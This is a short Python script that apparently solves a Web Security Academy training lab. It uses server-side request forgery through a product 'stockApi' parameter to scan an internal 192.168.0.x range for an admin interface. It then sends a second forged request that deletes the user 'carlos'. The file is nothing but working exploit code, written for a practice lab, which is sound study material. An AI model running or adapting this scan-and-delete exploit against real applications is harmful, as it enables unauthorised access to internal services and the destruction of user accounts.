import requests

s = requests.Session()
url = 'https://ac9f1f7f1e3b29a780860f7f00d100a0.web-security-academy.net'

i = 1
while(i < 256):
    exploit = {
        'stockApi' : f'http://192.168.0.{i}:8080/admin'
    }
    resp = s.post(url + '/product/stock', data=exploit)
    if(resp.status_code == 200):
        print(i)
        print(resp.status_code)
        print(resp.text)
        exploit = {
            'stockApi' : f'http://192.168.0.{i}:8080/admin/delete?username=carlos'
        }
        resp = s.post(url + '/product/stock', data=exploit)
        break
    i += 1
